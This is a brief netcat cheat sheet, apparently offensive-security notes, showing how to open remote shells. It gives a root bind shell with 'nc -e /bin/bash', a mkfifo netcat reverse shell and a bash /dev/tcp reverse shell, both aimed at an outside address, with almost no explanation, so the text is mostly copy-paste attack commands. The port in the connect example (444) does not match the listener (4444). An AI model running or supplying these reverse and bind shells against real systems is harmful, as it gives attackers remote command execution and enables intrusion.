# Netcat

Hand over a shell:
```
root$ nc -lvp 4444 -e /bin/bash
```

Now connect to it from another user
```
otheruser$ nc 192.168.1.101 444
whoami
root
```

The same thing can be done in reverse. The one listening is giving us the shell.

Additional Tricks

nc reverse shell without -e:
```
rm /tmp/pipe; mkfifo /tmp/pipe; cat /tmp/pipe|/bin/sh -i 2>&1|nc 10.0.0.189 1234 > /tmp/pipe
```
/dev/tcp reverse shell:
```
bash -i >& /dev/tcp/10.0.0.189/80 0>&1
```
